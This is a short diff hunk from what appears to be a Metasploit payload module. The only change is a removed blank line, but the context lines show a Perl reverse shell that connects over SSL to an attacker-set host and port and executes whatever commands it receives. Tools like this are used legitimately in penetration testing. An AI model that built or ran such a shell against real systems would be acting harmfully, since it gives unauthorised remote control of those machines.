@@ -53,5 +53,4 @@ module MetasploitModule
     cmd += "$c=IO::Socket::SSL->new(\"#{lhost}:#{datastore['LPORT']}\");"
     cmd += "while(sysread($c,$i,8192)){syswrite($c,`$i`);}'"
   end
-
 end
